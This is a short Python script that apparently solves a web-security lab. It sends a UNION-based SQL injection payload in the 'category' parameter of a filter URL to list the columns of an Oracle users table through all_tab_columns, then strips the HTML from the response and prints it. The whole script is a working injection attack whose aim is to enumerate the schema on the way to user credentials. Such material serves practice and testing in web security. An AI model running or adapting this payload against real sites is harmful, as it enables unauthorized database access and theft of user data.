import requests
import re

filter_url = input("Enter the category filter URL (ending at /filter): ")
users_table = input("Enter the users table name you found (e.g. USERS_ABCDEF): ")

def clean(text):
    text = re.sub(r'<script.*?</script>', '', text, flags=re.DOTALL)
    text = re.sub(r'<style.*?</style>', '', text, flags=re.DOTALL)
    text = re.sub(r'<[^>]+>', '\n', text)
    return "\n".join(line.strip() for line in text.splitlines() if line.strip())

response = requests.get(filter_url, params={
    "category": f"' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='{users_table}'--"
})
print(clean(response.text))
